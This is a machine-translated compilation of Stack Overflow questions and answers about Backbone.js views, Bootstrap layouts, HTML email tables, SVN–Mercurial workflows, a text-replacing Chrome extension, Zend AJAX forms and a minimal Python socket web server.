      'click .cancel': 'cancelItem'
    },

    initialize: function(options){
      if (!this.model.isNew()) {
        this.model.bind('change', this.render, this)
        this.model.fetch()
      }
    },

    render: function(){
      var item = this.model.attributes
      var template = this.model.isNew() ? newTemplate : editTemplate
      var compiledTemplate = Mustache.render(template, item )
      $(this.el).html(compiledTemplate)
      if (this.model.isNew()) $('#itemName').focus()
      return this
    },

    /*
     *  Event actions
     */

    saveItem: function(e) {
      e.preventDefault()

      var item = {
        name: $('#itemName').val(),
        price: $('#itemPrice').val()
      }
      var self = this
      this.model.save(item, {
        success: function (model, response) {
          app.navigate('items/'+model.id, {trigger: true, replace: true})
        },
        error: function (model, response) {
          new Bootstrap.alert({ el: $('#page') }).render(response, 'error')
        }
      })
    },

    cancelItem: function (e) {
      if (this.model.isNew())
        app.navigate('items', {trigger: true, replace: true})
      else
        app.navigate('items/'+this.model.id, {trigger: true, replace: true})
    }

  })

  return ItemEditView
}) 
```

## 物品型号

```
define([
  'use!underscore',
  'use!backbone'
], function(_, Backbone) {
  var Item = Backbone.Model.extend({

    urlRoot: 'api/items',

    idAttribute: '_id'

  });

  return Item;
}); 
```

## 项目集合

```
define([
  'jquery',
  'use!underscore',
  'use!backbone',
  'models/item'
], function($, _, Backbone, Item){
  var Items = Backbone.Collection.extend({

    model: Item,

    url: 'api/items/'

  });

  return Items;
}); 
```

链接到[源代码](https://github.com/madhums/bbstarter-demo)（以防万一）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T07:02:33.913

当您使用完表单后，无论是提交还是取消表单，您都必须通过调用 ItemView.remove() 或至少取消委托事件来销毁视图或视图：：

```
saveItem: function(e) {
  e.preventDefault()

  var item = {
    name: $('#itemName').val(),
    price: $('#itemPrice').val()
  }
  var self = this
  this.model.save(item, {
    success: function (model, response) {
      app.navigate('items/'+model.id, {trigger: true, replace: true})
    },
    error: function (model, response) {
      new Bootstrap.alert({ el: $('#page') }).render(response, 'error')
    }
  })
  this.remove(); // undelegate events for later views.
},

cancelItem: function (e) {
  if (this.model.isNew())
    app.navigate('items', {trigger: true, replace: true})
  else
    app.navigate('items/'+this.model.id, {trigger: true, replace: true});
  this.remove(); // undelegate events for later views.
} 
```

由于事件被委托给 #page 并且您的旧视图在创建新视图后存在，因此它们的保存和取消方法仍将触发，直到它们被删除。

# html - 在引导程序中，如何使缩略图流畅地调整大小

> ID：10114185
> 
> 赞同：1
> 
> 时间：2012-04-11T21:21:07.387
> 
> 标签：html, twitter-bootstrap, fluid-layout

我正在使用 bootstrap 2.0 进行流畅的布局。但是，当浏览器调整大小或从 iPhone 上看到它时，我发现它很糟糕：

![缩略图休息区](../Images/bb74b32b77ce2dd82c799260f9f62f0f.png)

这是我的标记：

```
 <div id="features" class="row-fluid">
        <div class="span12">
          <ul class="thumbnails">
            <li class="span4">
              <div class="thumbnail">
                <img src="http://placehold.it/128x128" width="128" height="128" alt="Orders" />
                <h3>Pedidos</h3>
                <p>Genera ordenes de pedidos para su facturacion posterior</p>
              </div>
            </li>

            <li class="span4">
              <div class="thumbnail">
                <img src="http://placehold.it/128x128" width="128" height="128" alt="Invoices" />
                <h3>Facturas</h3>
                <p>Factura las ventas realizadas</p>
              </div>
            </li>

            <li class="span4">
              <div class="thumbnail">
                <img src="http://placehold.it/128x128" width="128" height="128" alt="Customers" />
                <h3>Clientes</h3>
                <p>Ingrese & actuelize los datos de los clientes</p>
              </div>
            </li>

            <li class="span4">
              <div class="thumbnail">
                <img src="http://placehold.it/128x128" width="128" height="128" alt="Products & Stock" />
                <h3>Productos</h3>
                <p>Ingrese & actuelize los datos de los productos y su inventario</p>
              </div>
            </li>

            <li class="span4">
              <div class="thumbnail">
                <img src="http://placehold.it/128x128" width="128" height="128" alt="Sincronization with ERP" />
                <h3>Impresion</h3>
                <p>Genera impresion de tiquets en papel con la impresora P25</p>
              </div>
            </li>

            <li class="span4">
              <div class="thumbnail">
                <img src="http://placehold.it/128x128" width="128" height="128" alt="Sincronization with ERP" />
                <h3>Sincronizacion</h3>
                <p>Sincroniza los datos con ERPs seleccionados</p>
              </div>
            </li>
          </ul>
        </div><!--/span-->   
      </div><!--/row--> 
```

（同样的零 CSS 标记也适用于坏事）

我已经尝试通过 CSS 设置宽度/高度，但这会破坏流程。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T08:31:39.663

除非您使用大小完全相同且分布均匀的图像，否则使用纯 css 解决您的挑战是非常困难的，尽管 boostrap 有多么神奇。您可以尝试使用`.row`而不是`.row-fluid`查看流体样式是否会导致严重中断，但除此之外，如果您想要“防弹”，您可能需要考虑使用 javascript。

可能类似于：[masonry.js](http://masonry.desandro.com/)或[Isotope](http://isotope.metafizzy.co/index.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T14:36:17.377

Bootstrap 现在有了响应式支持，3.0 分支[默认会有](https://github.com/twitter/bootstrap/tree/3.0.0-wip)。

# java - 命令行输入修改和 XML

> ID：10114186
> 
> 赞同：0
> 
> 时间：2012-04-11T21:21:12.207
> 
> 标签：java, xml

我打算制作一个 java 应用程序，它从命令行获取输入以创建一个 xml 文件，然后可以使用放置/编辑记录更新 xml 文件，读取 xml 文件并删除 xml 文件中的条目。让从命令提示符修改 xml 是否有意义，以及与我的 java 应用程序一起使用的 xml 相关工具是什么来实现它

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:31:00.587

如果您想从您的应用程序中修改 XML，您可能需要使用 DOM 或类似 DOM 的界面。因此，您可能会考虑使用 Jdom，只要您不需要使用混合内容 XML，它就会是更好的 API。在后一种情况下，您必须直接处理 Java 的 DOM 接口。

您也可以尝试不只使用 Java 对象使用 XML，然后使用例如 XStream 将它们序列化/反序列化为 XML。

Java 作为一种面向对象的语言，不适合使用像 XML 这样的树状结构。函数式语言会更好，所以考虑使用 Scala（可以与 Java 代码一起使用），它具有很好的处理 XML 的工具。

# html - HTML 表格嵌套 | 对齐 - 2 x 在同一行

> ID：10114190
> 
> 赞同：0
> 
> 时间：2012-04-11T21:21:48.277
> 
> 标签：html

希望你能帮我解决这个问题，这可能真的很简单，但我很不擅长嵌套。

这是简单的代码：

```
 <table border="0" cellpadding="0" cellspacing="0" width="600">

        <tr>
            <td width="600"><a href="#" target="_blank"></td>
        </tr>
        <tr>
        <td valign="top" align="center"></td>
        </tr>

        <tr>
        <td valign="top" align="center" bgcolor="#000000" colspan="2"><a href="#" target="_blank"><img src="#" width="9" height="11" border="0" alt="" style="display:block;"></a><font style="font-size: 12px" color="#ffffff" face="Arial, Helvetica, sans serif"><b><a href="#" target="_blank" style="text-decoration: none; color: #ffffff">LEAVE A REVIEW TO <font color="#ff9a11">WIN &pound;250</font> WORTH OF X VOUCHERS</a></b></font></td>

        </tr>

        </table> 
```

如果您将其弹出到编辑器中或在浏览器中打开，我要做的就是将两个数据单元格放在同一行，您会注意到有一个没有图像的图像，它是 9x11px 的图像，它是一个项目符号点的图像，这应该让你知道我想做什么。但是，我尝试一切都在精神上。

如果您能解释为什么会发生这种情况，那就太棒了，因为我正在学习电子邮件的 HTML（正在为我的工作发送电子邮件）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T21:26:51.087

我从子弹图像中删除了样式 - display: block。这种风格使图像活在自己的身上`line`。

```
<table border="0" cellpadding="0" cellspacing="0" width="600">

        <tr>
            <td width="600"><a href="#" target="_blank"></td>
        </tr>
        <tr>
        <td valign="top" align="center"></td>
        </tr>

        <tr>
        <td valign="top" align="center" bgcolor="#000000" colspan="2"><a href="#" target="_blank"><img src="#" width="9" height="11" border="0" alt=""></a><font style="font-size: 12px" color="#ffffff" face="Arial, Helvetica, sans serif"><b><a href="#" target="_blank" style="text-decoration: none; color: #ffffff">LEAVE A REVIEW TO <font color="#ff9a11">WIN &pound;250</font> WORTH OF X VOUCHERS</a></b></font></td>

        </tr>

        </table> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T21:25:18.860

也许这就是你要找的东西？

```
 <table border="0" cellpadding="0" cellspacing="0" width="600">
      <tr>
        <td>Column 1 of Row 1 </td>
        <td>Column 2 of Row 1</td>
      </tr>
      <tr>
        <td colspan="2">Only column in Row 2</td>
      </tr>
    </table> 
```

您的问题是，当没有两列可以跨越时，您的`<td>`a为 2。`colspan`你的另外两列被分成两行，我在那个代码中为你调整了。

编辑：我已将表格代码清理为准系统，以便您更容易理解

# svn - Mercurial 和 SVN 工作流程问题

> ID：10114204
> 
> 赞同：1
> 
> 时间：2012-04-11T21:23:25.160
> 
> 标签：svn, mercurial

我有一个有趣的源代码控制工作流程问题。

我的公司正在与使用 SVN 跟踪当前正在积极开发的产品的第三方承包商合作。我们将在接下来的几个月内接管这个存储库，但我们希望开始研究项目中的其他功能。出于显而易见的原因，我们的承包商拒绝了我们提交访问权限，但同意读取他们的 SVN 存储库的访问权限。

对于我们的 Windows 开发机器，我们使用 mercurial 存储库。 **我想以某种方式将 SVN 存储库复制到新的 HG 存储库，并定期将提交给 SVN 的更改合并到 HG 中。** 换句话说，我们将在两个不同的存储库中并肩工作。

有没有人做过这样的事情？关于方法的任何建议？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T00:34:53.170

我想任何过程都只会随着您在 mercurial 中的变化增加而变得更糟，并且与 SVN 中的变化相距甚远，而 SVN 中的变化永远不会与您的 mercurial 变化合并。但是，我很想知道 mercurial 与这种复杂性如何公平地合并。我会这样处理：

1）从 svn 导出以创建您的 hg 存储库，让我们将此`/SvnExportCleanHG` Clone 称为工作副本，您公司的所有新功能都将在该副本中使用：`/WorkingHG`

2）当您想从 SVN 中提取新更改时，请执行 svn update from`/SvnExportCleanHG`并将其提交到 clean repo。这将有 2 个修订版，来自 svn 的原始版本和最新版本。从内部`/WorkingHG`运行`hg pull /SvnExportCleanHG`并合并所有不可避免的变化。然后将其提交给 WorkingHG 存储库。

现在，您已尽最大努力尝试使用 mercurials 合并，并且您仍然`/SvnExportCleanHG`可以从 SVN 中提取下一个更改而不会发生任何冲突。

每当您想再次从 svn 更新时，请执行第 2 步。从 svn 更新并在 clean repo 中提交永远不会冲突，因为它只会反映 svn，但它始终允许您从工作副本 HG 中提取和合并，因为它们是基于相同。

这取决于您的更改级别以及 SVN 的更改是否会为您带来很多收益。如果你们停留在代码的不同基线中，这将是一个很棒的工作流程，并且可以节省大量的手动工作。如果您重叠严重，这仍然有效，但它只会促进您的工作流程，而不是解决许多合并问题。

如果您尝试过，我会对它的结果非常感兴趣。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T20:48:46.727

在您开始合并之前，SVN + Mercurial 工作良好。但是，如果您不使用合并，为什么还需要 mercurial。我们几乎有过这样的情况。我们使用 hgsubversion 扩展将 svn 复制到 mercurial，现在所有活跃的开发都在 mercurial 中。然后有时我们只是将 mercurial 工作目录复制到没有历史记录和所有分支的 svn。

# javascript - 用于替换文本 DOM 节点的 Chrome 扩展...不

> ID：10114212
> 
> 赞同：3
> 
> 时间：2012-04-11T21:24:16.370
> 
> 标签：javascript, dom, google-chrome, google-chrome-extension

更新：在“我不是”的指导下，我解决了这个问题；最后的工作代码。

我目前正在开发我的第一个 Chrome 扩展程序，旨在对查看的网页执行文本替换。我一直在努力尝试了解 DOM 操作，最终我想出了以下内容。理论上这应该遍历整个 DOM 表，找到文本节点，克隆它们，替换文本（如果适用），并用克隆替换原始节点。

这是我的 manifest.json ......

```
{
    "name": "My app",
    "version": "1.0",
    "manifest_version": 2,
    "description": "Do thing.",
    "permissions": [
        "tabs", "http://*/"
    ],
    "content_scripts": [
        {
            "matches": ["http://*/*"],
            "js": ["myapp.js"],
            "run_at": "document_end"
        }
    ]
} 
```

还有 myapp.js；

```
function myapp() {
    var nodes = document.getElementsByTagName("*");
        for(var i = 0; i < nodes.length; i++) {
             if(nodes[i].type == "text") {
                  var parent = nodes[i].parentnode;
                  var newnode = nodes[i].cloneNode(true);
                  newnode.data.replace("test text","replacement test text");
                  parent.replaceChild(newnode, nodes[i]);
             };
        };
};
myapp(); 
```

我已经导入并激活了扩展。Chrome 的 javascript 控制台之前已显示错误，这意味着它正在运行，但现在没有，这意味着没有基本的拼写错误。我假设我对如何更改或交换文本节点有误，或者对如何设置清单文件或 js 文件有基本的误解，但我试图找出哪个我碰壁了。

任何帮助将不胜感激！

更新：这是工作版本。

```
function myapp() {
    var nodes = document.getElementsByTagName("*");
    for(var i = 0; i < nodes.length; i++) {
         var subNodes = nodes[i].childNodes;
         for (var j = 0; j < subNodes.length; j++) {
            var node = subNodes[j];
            if (node.nodeType === 3) {
                if (node.data) {
                    node.data = node.data.replace(/test text/g,"replacement test text");
                }
            }
        }
    }
};
myapp(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T21:58:45.023

由于您正在修改 DOM，因此迭代也*可能*存在问题，并且`nodes`是一个“实时” *NodeList*，它将随着 DOM 更改而更新。

不确定这是否是一个问题，因为您似乎在同一索引处进行交换，但我不确定。您可以尝试将*NodeList*转换为数组，或尝试反向迭代。

* * *

但是由于您只处理文本节点，因此您似乎根本不需要`.replaceChild`。您可以直接更新`.data`文本节点的。

* * *

另一件事是您正在检查`.type`财产，什么时候应该是`.nodeType`财产......

```
if(nodes[i].nodeType == 3) { 
```

或者`nodeName`...

```
if(nodes[i].nodeName == '#text') { 
```

* * *

哦，还有一件事。您无法使用 获取文本节点`getElementsByTagName('*')`，因为它仅获取*元素*。

如果您决定这样做，则需要添加代码来处理元素的子文本节点。

```
function myapp() {
    var nodes = document.getElementsByTagName("*");
    for(var i = 0; i < nodes.length; i++) {
         var el = nodes[i];
         for (var j = 0; j < el.childNodes; j++) {
             var node = el.childNodes[j];
             if (node.nodeType === 3)
                 node.data = node.data.replace("test text","replacement test text");
         }
    }
}; 
```

# zend-framework - 将元素添加到使用 zend_form 创建的组合框，其中包含来自 ajax 响应的元素

> ID：10114217
> 
> 赞同：0
> 
> 时间：2012-04-11T21:24:44.920
> 
> 标签：zend-framework, jquery, combobox

我如何用来自 ajax 响应的元素填充组合框 ps：组合框是用 Zend_form 创建的

我的表格

```
<?php

class Application_Form_SearchProduct extends Zend_Form
{

    public function init()
    {
      $this->setName("SearchProduct");

      $a=new Application_Model_Class_Categories();
      $this->setMethod('post');  

      /* Combo box Category*/
        $this->addElement('Select', 'Category',array(
         'label'      => 'Category:',
         'AutoComplete'=> true, 

          'MultiOptions'   => $a->GetCategories(),
         'required' => true )); 

                 /* Combo box SubCategory*/

        $this->addElement('Select', 'SubCategory',array(
         'label'      => 'Sub Category:',
         'AutoComplete'=> true, 

         'required' => true )); 

      $this->addElement('submit', 'Search', array(
            'required' => false,
            'ignore'   => true,
            'label'    => 'Search',
        ));  }   }
?> 
```

js脚本

```
<script type="text/javascript">

    //for send data i'll use jquery library

    $(document).ready( function(){
            $('#Category').change(function()
               {

                   var message=$('#Category option:selected').text();
                  if (message != '') {

                      //run ajax

                     $.ajax({
type: "GET", // envoi des données en POST
url: 'http://localhost/EverTags1/Authentification1/public/Product', 

    //baseurl+"/Product/index", 

data:  {'message' : message},

cache: false,
success:  function (respond) {
                               //put respond in class show-msg

                                     //$("#menuLeft").html(respond);  
                                    $("#SubCategory").add(respond);                 

 }
})
 ; }});});
   </script> 
```

我的行动

```
 public function indexAction()
    {

       $form = new Application_Form_SearchProduct(); 

       $this->view->form = $form;
       $b=new Application_Model_Class_SubCategories();
       $message = $_GET['message'];
       $result = $b->GetSubCategories($message );
       echo($result[0]) ;

    } 
```

$result[0] 包含以下字符串 Women's Clothing

当我从第一个组合框中选择元素时，我遇到了另一个问题，页面自动复制，我找不到问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T02:18:30.857

代替：

```
echo($result[0]) 
```

尝试：

```
$this->view->result = $result[0]; 
```

并将您的成功功能更改为：

```
success: function(data.result) {
    $("#SubCategory").add(data.result);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T14:29:26.103

我找到了我的问题的解决方案

```
<script type="text/javascript">

    //for send data i'll use jquery library

    $(document).ready( function(){
            $('#Category').change(function()
               {

                  var message=$('#Category option:selected').text();
                  if (message != '') {
$.ajax({
type: "GET", // envoi des données en POST
dataType : 'json',
url:  //baseurl+"Product/index",
    'http://localhost/EverTags1/Authentification1/public/Product/index', 
async: false,  
data:{"message" : message}, 
success:  
    function (respond) {

   var json=JSON.stringify(respond);
   var  objet = eval('(' + json + ')');

      e=objet.length;

      var str = "";

    for ( var count = 0 ; count < e; count++ ) { 

        str += "<option value='" + count + "'>" + objet[count].name+ "</option>"
    } 

     $("#SubCategory").empty().append(""+str);
 }

}
); 

}});});
   </script> 
```

那个行动：

```
public function indexAction()
    {

         $form = new Application_Form_SearchProduct(); 
         $this->view->form = $form;

if($this->_request->isXmlHttpRequest()) {
      $this->_helper->viewRenderer->setNoRender();
      $this->_helper->layout->disableLayout();
           $message = $_GET['message'];

         $soap_client = new nusoap_client('http://127.0.0.1/evertags/GetCategorySubCategories/servSubCategories.php?wsdl','true');
         $proxy = $soap_client->getProxy();
         $result= $proxy->ReturnSubCategoriesNames($message);

          echo $result;

} 
```

我希望它会帮助其他人

# xaml - 如何在单击按钮之前触发 selectionchanged？

> ID：10114220
> 
> 赞同：0
> 
> 时间：2012-04-11T21:24:58.567
> 
> 标签：xaml, windows-8

我有一个 GridView。它的数据模板是一个网格，其中包含一个按钮。问题是，按钮的单击事件在网格视图的选择更改之前触发，因此我无法从单击事件处理程序访问正确的选定项目。单击按钮时，我想使用gridview的选定项目。我怎样才能做到？也许在gridview中找到发件人按钮？我怎样才能做到这一点？

谢谢，汤姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T11:14:57.350

我使用按钮的数据上下文，它继承了选定项的数据上下文，所以我很好。

# javascript - 如何使用此功能从 HTML 表单中获取多个字段并复制它？

> ID：10114221
> 
> 赞同：0
> 
> 时间：2012-04-11T21:24:59.403
> 
> 标签：javascript, html

```
function copyToClipboard (text) {
  window.prompt ("Copy to clipboard: Ctrl+C, Enter", text);
} 
```

表格如下所示：

```
<table>
<form action="myform.php" method="post" onsubmit="return copytoClipboard()"           name="incidentCreator">
<th colspan="2">Incident Creator</th>
<tr>
<td>Email: <input type="text" name="email" value="" /></td>
<td rowspan="9"> 

</td>
</tr>
<tr>
<td>Name: <input name="name" value=""></td>
</tr>
<tr>

<td>Phone: <input type="text" name="phone" value="" /></td>
</tr>

function copyToClipboard (text) {
window.prompt ("Copy to clipboard: Ctrl+C, Enter", text);
} 
```

有人将此作为复制到剪贴板的解决方案发布，但它没有显示如何使用它。我是 Javascript 新手，正在尝试将 HTML 表单中的文本输出为以下格式

谁能向我展示一个示例，说明我将如何获取上述表单数据并将其呈现为准备好使用此 Javascript 函数进行复制？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T21:38:26.520

如果您希望用户以您想要的格式获取表单，您必须自己根据 HTML 表单呈现文本。使用 jQuery 获取您需要的所有字段，然后生成最终文本并让用户复制您自己呈现的格式化文本。您可以使用

```
标签在您的 html 中具有预先格式化的文本（它将呈现换行符和制表符等...）。例如，您可以使用弹出窗口来显示最终文本。无论如何，javascript中没有可以自动执行您想做的事情的功能。

            回答 #2

赞同：0

时间：2012-04-11T21:39:25.567

将您的表单转换为 JSON 字符串。首先从您的字段（http://stackoverflow.com/questions/1184624/convert-form-data-to-js-object-with-jquery）创建 JavaScript 对象，然后使用[http://api.jquery将其转换为字符串.com/jQuery.parseJSON](http://api.jquery.com/jQuery.parseJSON)。

```

# python - 如何仅使用套接字库通过 Python 正确发送 HTTP 响应？

> ID：10114224
> 
> 赞同：18
> 
> 时间：2012-04-11T21:25:06.263
> 
> 标签：python, http, sockets, webserver

我有一个用 Python 编写的非常简单的网络服务器。它在端口 13000 上侦听，如果在浏览器中打开，我怎样才能让它提供一个简单的“Hello World”网页`http://localhost:13000`？

那里有我的代码：

```
# set up socket and connection
while True:
    sock, addr = servSock.accept()
    # WHAT GOES HERE?
    sock.close() 
```

如您所见，我不确定如何实际发回网页？

我只需要使用`socket`图书馆。

**编辑：**问题不在于我不知道如何制定 HTTP 响应，我不知道如何真正让它显示在我的浏览器中！它只是保持旋转/加载。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-04-11T21:28:32.283

**根据问题变化更新**

可能，它一直在旋转，因为在缺少`Content-Length`和`Connection`headers 的情况下，浏览器可能会认为它是`Connection: keep-alive`，因此它会永远继续从您的服务器接收数据。尝试发送`Connection: close`，并传递实际`Content-Length`以查看是否有帮助。

* * *

这不会达到你的预期吗？:)

```
#!/usr/bin/env python
# coding: utf8

import socket

MAX_PACKET = 32768

def recv_all(sock):
    r'''Receive everything from `sock`, until timeout occurs, meaning sender
    is exhausted, return result as string.'''

    # dirty hack to simplify this stuff - you should really use zero timeout,
    # deal with async socket and implement finite automata to handle incoming data

    prev_timeout = sock.gettimeout()
    try:
        sock.settimeout(0.01)

        rdata = []
        while True:
            try:
                rdata.append(sock.recv(MAX_PACKET))
            except socket.timeout:
                return ''.join(rdata)

        # unreachable
    finally:
        sock.settimeout(prev_timeout)

def normalize_line_endings(s):
    r'''Convert string containing various line endings like \n, \r or \r\n,
    to uniform \n.'''

    return ''.join((line + '\n') for line in s.splitlines())

def run():
    r'''Main loop'''

    # Create TCP socket listening on 10000 port for all connections, 
    # with connection queue of length 1
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, \
                                socket.IPPROTO_TCP)
    server_sock.bind(('0.0.0.0', 13000))
    server_sock.listen(1)

    while True:
        # accept connection
        client_sock, client_addr = server_sock.accept()

        # headers and body are divided with \n\n (or \r\n\r\n - that's why we
        # normalize endings). In real application usage, you should handle 
        # all variations of line endings not to screw request body
        request = normalize_line_endings(recv_all(client_sock)) # hack again
        request_head, request_body = request.split('\n\n', 1)

        # first line is request headline, and others are headers
        request_head = request_head.splitlines()
        request_headline = request_head[0]
        # headers have their name up to first ': '. In real world uses, they
        # could duplicate, and dict drops duplicates by default, so
        # be aware of this.
        request_headers = dict(x.split(': ', 1) for x in request_head[1:])

        # headline has form of "POST /can/i/haz/requests HTTP/1.0"
        request_method, request_uri, request_proto = request_headline.split(' ', 3)

        response_body = [
            '<html><body><h1>Hello, world!</h1>',
            '<p>This page is in location %(request_uri)r, was requested ' % locals(),
            'using %(request_method)r, and with %(request_proto)r.</p>' % locals(),
            '<p>Request body is %(request_body)r</p>' % locals(),
            '<p>Actual set of headers received:</p>',
            '<ul>',
        ]

        for request_header_name, request_header_value in request_headers.iteritems():
            response_body.append('<li><b>%r</b> == %r</li>' % (request_header_name, \
                                                    request_header_value))

        response_body.append('</ul></body></html>')

        response_body_raw = ''.join(response_body)

        # Clearly state that connection will be closed after this response,
        # and specify length of response body
        response_headers = {
            'Content-Type': 'text/html; encoding=utf8',
            'Content-Length': len(response_body_raw),
            'Connection': 'close',
        }

        response_headers_raw = ''.join('%s: %s\n' % (k, v) for k, v in \
                                                response_headers.iteritems())

        # Reply as HTTP/1.1 server, saying "HTTP OK" (code 200).
        response_proto = 'HTTP/1.1'
        response_status = '200'
        response_status_text = 'OK' # this can be random

        # sending all this stuff
        client_sock.send('%s %s %s' % (response_proto, response_status, \
                                                        response_status_text))
        client_sock.send(response_headers_raw)
        client_sock.send('\n') # to separate headers from body
        client_sock.send(response_body_raw)

        # and closing connection, as we stated before
        client_sock.close()

run() 
```

更详细的说明请参见[HTTP 协议说明](http://www.rfc-editor.org/rfc/rfc2616.txt)。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2015-01-20T22:38:48.953

```
# set up socket and connection
while True:
    sock, addr = servSock.accept()
    sock.send("""HTTP/1.1 200 OK
Content-Type: text/html

<html><body>Hello World</body></html>
""");
    sock.close() 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-04-11T21:30:13.327

发回类似的东西：

```
HTTP/1.1 200 OK
Date: Wed, 11 Apr 2012 21:29:04 GMT
Server: Python/6.6.6 (custom)
Content-Type: text/html 
```

然后是实际的html代码。确保在 Content-Type 行之后和 html 之前有一个换行符。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-11T21:34:48.753

或者，如果您只是不想记住完整的协议，您可以使用以下命令再次找到它：

```
 % nc stackoverflow.com 80
GET / HTTP/1.1
Host: stackoverflow.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=60
Content-Type: text/html; charset=utf-8
Expires: Wed, 11 Apr 2012 21:33:49 GMT
Last-Modified: Wed, 11 Apr 2012 21:32:49 GMT
Vary: *
Date: Wed, 11 Apr 2012 21:32:49 GMT
Content-Length: 206008

[...]
 % 
```

好吧，您通常会更喜欢一个比 stackoverflow 更简洁的网站（通常只提供静态文件）；）

最低要求（您会在答案中找到）是：

```
sock.send(r'''HTTP/1.0 200 OK
Content-Type: text/plain

Hello, world!

''') 
```

服务器必须两次返回才能获得答案，否则浏览器会无限期地等待标头

但是要模仿网络服务器的行为，不要忘记*只有*在浏览器向您发送一些数据后跟两个回车后才发送您的答案，通常您可以使用以下方式获取它发送的内容：

```
 % nc -kl localhost 13000
GET / HTTP/1.1
Host: localhost:13000
User-Agent: Mozilla/5.0...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive

 % 
```

所以你可以改进你的测试程序

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2017-09-24T19:52:24.317

我接受了先前的答案并编辑了 Python3 utf-8 和字节编码的代码。感谢您的原始答案，它帮助了很多。

```
import socket

MAX_PACKET = 32768

def recv_all(sock):
    r'''Receive everything from `sock`, until timeout occurs, meaning sender
    is exhausted, return result as string.'''

    # dirty hack to simplify this stuff - you should really use zero timeout,
    # deal with async socket and implement finite automata to handle incoming data

    prev_timeout = sock.gettimeout()
    try:
        sock.settimeout(0.1)

        rdata = []
        while True:
            try:
                # Gotta watch for the bytes and utf-8 encoding in Py3
                rdata.append(sock.recv(MAX_PACKET).decode('utf-8')) 
            except socket.timeout:
                return ''.join(rdata)

        # unreachable
    finally:
        sock.settimeout(prev_timeout)

def normalize_line_endings(s):
    r'''Convert string containing various line endings like \n, \r or \r\n,
    to uniform \n.'''
    test = s.splitlines()
    return ''.join((line + '\n') for line in s.splitlines())

def run():
    r'''Main loop'''

    # Create TCP socket listening on 10000 port for all connections,
    # with connection queue of length 1
    server_sock = socket.socket(socket.AF_INET,
                                socket.SOCK_STREAM,
                                socket.IPPROTO_TCP)
    #Added the port 13001 for debuging purposes 

    try:
        server_sock.bind(('0.0.0.0', 13000))
        print('PORT 13000')
    except:
        server_sock.bind(('0.0.0.0', 13001))
        print('PORT 13001')
    # except:
    #     server_sock.bind(('0.0.0.0', 13002))
    #     print('PORT 13002')

    server_sock.listen(1)

    while True:
        # accept connection
        try:
            client_sock, client_addr = server_sock.accept()

            # headers and body are divided with \n\n (or \r\n\r\n - that's why we
            # normalize endings). In real application usage, you should handle
            # all variations of line endings not to screw request body
            request = normalize_line_endings(recv_all(client_sock)) # hack again

            request_head, request_body = request.split('\n\n', 1)

            # first line is request headline, and others are headers
            request_head = request_head.splitlines()
            request_headline = request_head[0]
            # headers have their name up to first ': '. In real world uses, they
            # could duplicate, and dict drops duplicates by default, so
            # be aware of this.
            request_headers = dict(x.split(': ', 1) for x in request_head[1:])

            # headline has form of "POST /can/i/haz/requests HTTP/1.0"
            request_method, request_uri, request_proto = request_headline.split(' ', 3)

            response_body = [
                '<html><body><h1 style="color:red">Hello, world!</h1>',
                '<p>This page is in location %(request_uri)r, was requested ' % locals(),
                'using %(request_method)r, and with %(request_proto)r.</p>' % locals(),
                '<p>Request body is %(request_body)r</p>' % locals(),
                '<p>Actual set of headers received:</p>',
                '<ul>',
            ]

            for request_header_name, request_header_value in request_headers.items():
                response_body.append('<li><b>%r</b> == %r</li>' % (request_header_name,
                                                                    request_header_value))

            response_body.append('</ul></body></html>')

            response_body_raw = ''.join(response_body)

            # Clearly state that connection will be closed after this response,
            # and specify length of response body
            response_headers = {
                'Content-Type': 'text/html; encoding=utf8',
                'Content-Length': len(response_body_raw),
                'Connection': 'close',
            }

            response_headers_raw = ''.join('%s: %s\n' % (k, v) for k, v in \
                                                    response_headers.items())

            # Reply as HTTP/1.1 server, saying "HTTP OK" (code 200).
            response_proto = 'HTTP/1.1'.encode()
            response_status = '200'.encode()
            response_status_text = 'OK'.encode() # this can be random

            # sending all this stuff
            client_sock.send(b'%s %s %s' % (response_proto, response_status,
                                                            response_status_text))
            client_sock.send(response_headers_raw.encode())
            client_sock.send(b'\n') # to separate headers from body
            client_sock.send(response_body_raw.encode())

            # and closing connection, as we stated before

        finally:
            client_sock.close()

run() 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-12T02:28:48.600

您可能想要检查 Web 对象[http://www.webob.org/](http://www.webob.org/)

这是一个用于创建 http 兼容请求和响应的简单轻量级项目。你可以对你的请求/响应对象做任何事情......或者只是将繁重的工作委托给 WebObjects

样本

```
>>> from webob import Response
>>> res = Response()
>>> res.status
'200 OK'
>>> res.headerlist
[('Content-Type', 'text/html; charset=UTF-8'), ('Content-Length', '0')]
>>> res.body
'' 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-01-20T03:26:19.453

更新到其中一种解决方案，因为最新版本要求以字节格式发送数据

```
while True:
    sock, addr = servSock.accept()
    sock.sendall(b"HTTP/1.1 200 OK\n"
         +b"Content-Type: text/html\n"
         +b"\n" # Important!
         +b"<html><body>Hello World</body></html>\n");
    sock.shutdown(soket.SHUT_WR)
    sock.close() 
```

我本可以编辑上面的帖子，但队列已满 :(。
